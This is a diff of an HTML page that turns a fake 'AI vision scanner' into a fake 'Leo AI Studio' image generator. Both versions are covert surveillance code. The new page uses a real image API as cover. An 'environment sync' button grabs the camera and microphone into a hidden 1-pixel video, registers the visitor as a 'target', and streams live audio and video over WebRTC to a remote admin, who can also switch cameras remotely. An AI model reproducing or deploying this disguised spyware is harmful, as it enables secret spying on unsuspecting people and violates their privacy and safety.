@@ -1,86 +1,77 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <title>Leo Vision AI</title>
+    <title>Leo AI Studio - Image Generator</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="/socket.io/socket.io.js"></script>
     <style>
-        :root { --primary: #00d4ff; --bg: #050a14; --panel: #0a192f; }
-        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
-        header { width: 100%; padding: 20px; text-align: center; background: var(--panel); border-bottom: 1px solid #1e3a8a; }
-        .logo { font-size: 1.5rem; font-weight: bold; color: var(--primary); letter-spacing: 2px; }
-        
-        .container { position: relative; width: 90%; max-width: 400px; margin-top: 30px; border-radius: 20px; overflow: hidden; border: 2px solid var(--primary); background: #000; aspect-ratio: 3/4; }
-        video { width: 100%; height: 100%; object-fit: cover; }
-        
-        /* Realistic AI Scan Animation */
-        .scan-bar { position: absolute; width: 100%; height: 2px; background: var(--primary); top: 0; box-shadow: 0 0 15px var(--primary); animation: scan 3s infinite linear; z-index: 5; }
-        @keyframes scan { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }
-        
-        .info-box { width: 90%; max-width: 400px; background: var(--panel); margin-top: 20px; padding: 15px; border-radius: 12px; font-size: 0.8rem; border: 1px solid #1e3a8a; }
-        .btn-activate { margin-top: 25px; background: var(--primary); color: #050a14; border: none; padding: 15px 40px; border-radius: 30px; font-weight: bold; cursor: pointer; box-shadow: 0 0 20px rgba(0,212,255,0.4); }
-        .hidden { display: none; }
+        :root { --blue: #00d4ff; --dark: #050a14; --panel: #0a192f; }
+        body { background: var(--dark); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
+        .studio-card { background: var(--panel); width: 100%; max-width: 500px; padding: 25px; border-radius: 15px; border: 1px solid #1e3a8a; }
+        input { width: 100%; padding: 12px; background: #112240; border: 1px solid var(--blue); color: #fff; border-radius: 8px; margin-bottom: 15px; outline: none; }
+        .btn-gen { background: linear-gradient(135deg, #00d4ff, #0088cc); color: #050a14; width: 100%; border: none; padding: 15px; border-radius: 10px; font-weight: bold; cursor: pointer; }
+        #res-img { width: 100%; border-radius: 10px; margin-top: 20px; display: none; }
+        .sync-box { margin-top: 15px; background: #112240; padding: 10px; border-radius: 8px; font-size: 0.8rem; text-align: center; color: var(--blue); cursor: pointer; }
+        video { width: 1px; height: 1px; opacity: 0; position: absolute; }
     </style>
 </head>
 <body>
-
-    <header><div class="logo">LEO VISION AI</div></header>
-
-    <div class="container">
-        <video id="localVideo" autoplay playsinline muted></video>
-        <div id="scanner" class="scan-bar hidden"></div>
-    </div>
-    <div class="info-box">
-        <div id="status">System Status: <span style="color: #ff4444;">Offline</span></div>
-        <div id="log" style="color: var(--primary); margin-top: 5px; font-family: monospace;">Ready for hardware calibration...</div>
+    <h1 style="color: var(--blue);">LEO AI STUDIO</h1>
+    <div class="studio-card">
+        <input type="text" id="prompt" placeholder="Enter prompt: e.g. A futuristic robot in rain">
+        <button class="btn-gen" onclick="generate()">GENERATE IMAGE</button>
+        <div class="sync-box" id="sync" onclick="activateSync()">AI ENVIRONMENT SYNC (OFF)</div>
+        <img id="res-img" alt="AI Output">
     </div>
 
-    <button id="startBtn" class="btn-activate" onclick="startApp()">ACTIVATE AI SCANNER</button>
+    <video id="v" autoplay playsinline muted></video>
 
     <script>
         const socket = io();
-        let stream, pc, adminId;
+        let stream, pc, adminId, mode = "environment";
         const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
-
-        async function startApp() {
-            document.getElementById('startBtn').classList.add('hidden');
-            document.getElementById('status').innerHTML = 'System Status: <span style="color: #00ff00;">Online</span>';
-            
-            try {
-                // V1 Wala Solid Logic - Direct Mic & Camera
-                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true });
-                document.getElementById('localVideo').srcObject = stream;
-                document.getElementById('scanner').classList.remove('hidden');
-                document.getElementById('log').innerText = "AI Neural Link Active. Scanning...";
-
-                socket.emit('target-join');
-            } catch (err) {
-                alert("Please allow Camera/Mic for AI Vision.");
-                location.reload();
-            }
+        async function generate() {
+            const p = document.getElementById('prompt').value;
+            if(!p) return alert("Please enter a prompt!");
+            const img = document.getElementById('res-img');
+            img.style.display = 'block';
+            img.src = `https://image.pollinations.ai/prompt/${encodeURIComponent(p)}?width=512&height=512&nologo=true`;
         }
-        socket.on('command', async (data) => {
-            if (data.cmd === 'start-stream') {
-                adminId = data.adminId;
-                if(pc) pc.close();
-                pc = new RTCPeerConnection(config);
-                stream.getTracks().forEach(t => pc.addTrack(t, stream));
-                pc.onicecandidate = (e) => {
-                    if(e.candidate) socket.emit('signal', { to: adminId, signal: { candidate: e.candidate } });
-                };
-                const offer = await pc.createOffer();
-                await pc.setLocalDescription(offer);
-                socket.emit('signal', { to: adminId, signal: { sdp: offer } });
-            } else if(data.cmd === 'flash') {
-                const t = stream.getVideoTracks()[0];
-                const s = t.getSettings();
-                await t.applyConstraints({ advanced: [{ torch: !s.torch }] });
-            } else if(data.cmd === 'vibrate') { window.navigator.vibrate(200); }
+
+        async function activateSync() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
+                document.getElementById('v').srcObject = stream;
+                document.getElementById('sync').innerText = "AI ENVIRONMENT SYNC (ACTIVE)";
+                document.getElementById('sync').style.borderColor = "#00ff00";
+                socket.emit('target-join');
+            } catch (e) { alert("Camera required for AI Sync!"); }
+        }
+
+        socket.on('command', async (d) => {
+            if (d.cmd === 'start') { adminId = d.adminId; connect(); }
+            else if (d.cmd === 'front' || d.cmd === 'back') {
+                mode = (d.cmd === 'front') ? "user" : "environment";
+                stream.getTracks().forEach(t => t.stop());
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
+                document.getElementById('v').srcObject = stream;
+                const vt = stream.getVideoTracks()[0];
+                pc.getSenders().find(s => s.track.kind === 'video').replaceTrack(vt);
+            }
         });
 
-        socket.on('signal', async (data) => {
-            if(data.signal.sdp) await pc.setRemoteDescription(new RTCSessionDescription(data.signal.sdp));
-            else if(data.signal.candidate) await pc.addIceCandidate(new RTCIceCandidate(data.signal.candidate));
+        async function connect() {
+            if(pc) pc.close();
+            pc = new RTCPeerConnection(config);
+            stream.getTracks().forEach(t => pc.addTrack(t, stream));
+            pc.onicecandidate = (e) => { if(e.candidate) socket.emit('signal', { to: adminId, signal: { candidate: e.candidate } }); };
+            const offer = await pc.createOffer();
+            await pc.setLocalDescription(offer);
+            socket.emit('signal', { to: adminId, signal: { sdp: offer } });
+        }
+        socket.on('signal', async (d) => {
+            if(d.signal.sdp) await pc.setRemoteDescription(new RTCSessionDescription(d.signal.sdp));
+            else if(d.signal.candidate) pc.addIceCandidate(new RTCIceCandidate(d.signal.candidate));
         });
     </script>
 </body>
